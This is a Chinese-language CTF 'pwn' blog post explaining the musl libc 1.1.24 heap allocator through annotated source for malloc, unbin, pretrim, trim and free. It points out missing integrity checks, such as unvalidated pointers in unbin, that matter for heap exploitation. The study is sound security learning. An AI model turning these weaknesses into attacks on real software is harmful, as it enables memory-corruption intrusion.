<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32gl-A.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16gl-A.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="除了学习 glibc 的堆管理机制外，musl 也开始提上行程。 由于以前总是用模板思路做题，很多东西总是浮于表面，不能很好地系统性理解。因此有了回炉重造的想法，希望能从根本上理解堆管理的机制。">
<meta property="og:type" content="article">
<meta property="og:title" content="musl_pwn">
<meta property="og:url" content="http://example.com/2023/09/03/musl-pwn/index.html">
<meta property="og:site_name" content="Anza | 学习记录">
<meta property="og:description" content="除了学习 glibc 的堆管理机制外，musl 也开始提上行程。 由于以前总是用模板思路做题，很多东西总是浮于表面，不能很好地系统性理解。因此有了回炉重造的想法，希望能从根本上理解堆管理的机制。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031304719.png">
<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031404599.png">
<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031407062.png">
<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041212424.png">
<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041226665.png">
<meta property="article:published_time" content="2023-09-03T04:32:26.000Z">
<meta property="article:modified_time" content="2023-09-26T10:44:00.253Z">
<meta property="article:author" content="Anza">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031304719.png">

<link rel="canonical" href="http://example.com/2023/09/03/musl-pwn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>musl_pwn | Anza | 学习记录</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Anza | 学习记录" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Anza | 学习记录</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/03/musl-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Haida.png">
      <meta itemprop="name" content="Anza">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Anza | 学习记录">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          musl_pwn
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-09-03 12:32:26" itemprop="dateCreated datePublished" datetime="2023-09-03T12:32:26+08:00">2023-09-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-26 18:44:00" itemprop="dateModified" datetime="2023-09-26T18:44:00+08:00">2023-09-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>除了学习 glibc 的堆管理机制外，musl 也开始提上行程。</p>
<p>由于以前总是用模板思路做题，很多东西总是浮于表面，不能很好地系统性理解。因此有了回炉重造的想法，希望能从根本上理解堆管理的机制。</p>
<span id="more"></span>

<h2 id="1-Musl简述"><a href="#1-Musl简述" class="headerlink" title="1 Musl简述"></a>1 Musl简述</h2><p>​    musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/Alpine_Linux">Alpine Linux</a>（做过 Docker 镜像的应该很熟悉）、<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt</a>（常用于路由器）和 Gentoo 等。</p>
<p>​    musl libc 堆管理器约等同于 dlmalloc（glibc 堆管理器 ptmalloc2 的前身），因此某些部分如 chunk、unbin 与 glibc 十分相似。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码下载路径：</span><br><span class="line">https://git.musl-libc.org/cgit/musl</span><br><span class="line"></span><br><span class="line">编译命令（以1.1.24为例）：</span><br><span class="line">tar -xzvf musl-1.1.24.tar.gz</span><br><span class="line"><span class="built_in">cd</span> musl-1.1.24</span><br><span class="line">sudo su</span><br><span class="line">./configure --prefix=/usr/local/musl CFLAGS=<span class="string">&#x27;-O2 -v&#x27;</span> --enable-debug=<span class="built_in">yes</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">编译完成后，可在 /usr/lib/musl/lib 目录下找到 libc.so</span><br></pre></td></tr></table></figure>

<h2 id="2-Musl-1-1-24"><a href="#2-Musl-1-1-24" class="headerlink" title="2 Musl 1.1.24"></a>2 Musl 1.1.24</h2><p><code>malloc</code>和<code>free</code>的源码可以在<code>src/malloc/malloc.c</code>中查看，部分结构体和宏定义位于<code>src/internal/malloc_impl.h</code>。</p>
<h3 id="2-1-数据结构"><a href="#2-1-数据结构" class="headerlink" title="2-1 数据结构"></a>2-1 数据结构</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> psize, csize;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031304719.png" alt="image-20230903130448645" style="zoom: 67%;" />

<p>​    chunk 的结构如上，有点类似于 glibc ，但 chunk 之间不重用 psize，也就是说除了溢出之外，不能通过上一个 chunk 来修改下一个 chunk 的 psize 位。</p>
<p>​    psize 和 csize 都只有一种位于最低位的标志位 <strong>INUSE</strong>（glibc则有三种），INUSE 位为 1 说明 chunk 正在被使用，若为 0 则说明 chunk 已被释放或者通过 mmap 分配，需要 psize 的标志位进行进一步判断。</p>
<h4 id="mal-amp-bin"><a href="#mal-amp-bin" class="headerlink" title="mal &amp; bin"></a>mal &amp; bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>

<p>​    mal 的结构体记录着堆的状态，有三个成员：64位无符号整数 binmap、链表头部数组 bins、锁 free_lock。其中 binmap 记录每个 chunk 是否为空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031404599.png" alt="image-20230903140424558" style="zoom: 80%;" />

<p>​    bin 的结构体如上。head 和 tail 指针分别指向头部和尾部的 chunk，同时首部 chunk 的 prev 指针和尾部 chunk 的 next 指针指向了 bin 链表的头部，构成了循环链表。若链表为空，head 和 tail 为 0 或者指向链表头部自身。</p>
<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031407062.png" alt="image-20230903140736882" style="zoom:80%;" />

<p>​    以上为每个 bin 的 chunk 大小范围，前 32 个 bin 类似于 fastbin 和 smallbin，每个 bin 只对应于一种大小的 chunk；后 32 个 bin 类似于 large bin，一个 bin 对应于多种大小的 chunk，例如 bin 下标为 34 时，计算得知 chunk 大小为 0x620~0x700，即可以容纳 0x620、0x640、0x660、0x680、0x6a0、0x6c0、0x6e0、0x700（0x20 递增）大小的 chunk。</p>
<h3 id="2-2-malloc-实现"><a href="#2-2-malloc-实现" class="headerlink" title="2-2 malloc 实现"></a>2-2 malloc 实现</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    	<span class="comment">// 1. n 增加头部长度，并对齐 32 位</span></span><br><span class="line">        <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">// 如果 n 到达了 mmap 的门槛（0x38000），则使用 mmap 来申请 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">                <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">                <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (base == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                c = (<span class="type">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">                <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 2. 寻找 n 大小对应的 bin 下标</span></span><br><span class="line">        i = bin_index_up(n);</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            	<span class="comment">// 3. 查找 binmap</span></span><br><span class="line">                <span class="type">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">                <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">                    	<span class="comment">// 若所有可用 bin 为空，则调用 expand_heap 函数生成新的 chunk</span></span><br><span class="line">                        c = expand_heap(n);</span><br><span class="line">                        <span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">                                <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">                                c = PREV_CHUNK(c);</span><br><span class="line">                                NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">                                        x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            	<span class="comment">// 4. 获取大小最接近 n 的可用 bin 下标 j</span></span><br><span class="line">                j = first_set(mask);</span><br><span class="line">                lock_bin(j);</span><br><span class="line">            	<span class="comment">// 5. 获取下标为 j 的 bin 的首部</span></span><br><span class="line">                c = mal.bins[j].head;</span><br><span class="line">            	<span class="comment">// 6. 若符合条件，则使用 pretrim 分割 c，否则用 unbin 从链表中取出 c</span></span><br><span class="line">                <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">                        unlock_bin(j);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                unlock_bin(j);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 7. 回收 c 中大小超过 n 的部分</span></span><br><span class="line">        <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">        trim(c, n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    malloc 主要步骤是通过 binmap 选择 bin，然后取出 bin 首部的 chunk，且取出过程没有任何对链表和 chunk 头部的检测。详细步骤如下：</p>
<ol>
<li>对用户申请的大小 n 进行调整，增加头部长度并与 32 位对齐。</li>
<li>如果 n 达到 mmap 的大小，则使用 mmap 返回内存给用户，否则计算 n 对应 bin 下标 i，查找 binmap。</li>
<li>如果所有可用的 bin 为空，则生成一个新的 chunk，否则选择大小最接近的 bin，获取其首部的 chunk c。</li>
<li>如果 c 符合 pretrim 条件，则使用 pretrim 进行切割，否则使用 unbin 从链表中取出 c。</li>
<li>最后对 chunk 进行 trim，返回给用户。</li>
</ol>
<p>​    需要简单了解一下 unbin、pretrim 和 trim。</p>
<h4 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若 bin 中只有一个 chunk c，将 bin 设置为空 bin</span></span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">	<span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 位</span></span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    unbin 相当于 glibc 中的 unlink，作用是从 bin 双向链表中取出 chunk，取出过程并未检查 chunk 指针是否合法。</p>
<h4 id="pretrim"><a href="#pretrim" class="headerlink" title="pretrim"></a>pretrim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pretrim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n, <span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> n1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="comment">// 条件1：bin j 的下标大于等于 40</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 条件2：bin j 与 i 相隔了 3 个及以上</span></span><br><span class="line">    <span class="comment">// 或 j == 63 且 split 的大小大于 MMAP_THRESHOLD</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">		<span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 条件3：split 的大小属于 bin j 范围内，即同属于一个 bin</span></span><br><span class="line">	<span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切割出一块大小为 n 的 chunk</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;prev = self-&gt;prev;</span><br><span class="line">	split-&gt;next = self-&gt;next;</span><br><span class="line">	split-&gt;prev-&gt;next = split;</span><br><span class="line">	split-&gt;next-&gt;prev = split;</span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n;</span><br><span class="line">	next-&gt;psize = n1-n;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    pretrim 的功能是用于切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件，pretrim 从 bin 链表首部 chunk 切割出一块大小刚好符合需要的小 chunk，然后将小 chunk 分配给用户，链表首部地址保持不变。</p>
<h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 条件：self的大小 n1 大于 n+DONTCARE（0x10）个字节</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 self 的大小切割为 n，剩余部分称为新的 chunk split</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">	next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 split 释放到 bin</span></span><br><span class="line">	__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    malloc 的最后一步是 trim，主要作用是回收 chunk 超过需求大小的部分。trim 将多余的部分切割出来，然后将其释放到 bin 中，以减少内存浪费。</p>
<h3 id="2-3-free-实现"><a href="#2-3-free-实现" class="headerlink" title="2-3 free 实现"></a>2-3 free 实现</h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="comment">// 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或 double free</span></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的 csize 字段没有设置 INUSE 标志位，进入 unmap_chunk 函数。</p>
<h4 id="unmap-chunk"><a href="#unmap-chunk" class="headerlink" title="unmap_chunk"></a>unmap_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line">	<span class="type">char</span> *base = (<span class="type">char</span> *)self - extra;</span><br><span class="line">	<span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">	<span class="comment">/* Crash on double free */</span></span><br><span class="line">	<span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">	__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 psize 设置了 INUSE 标志位，视为 double free，程序 crash，否则视为 mmap chunk，调用 __munmap 进行释放。</p>
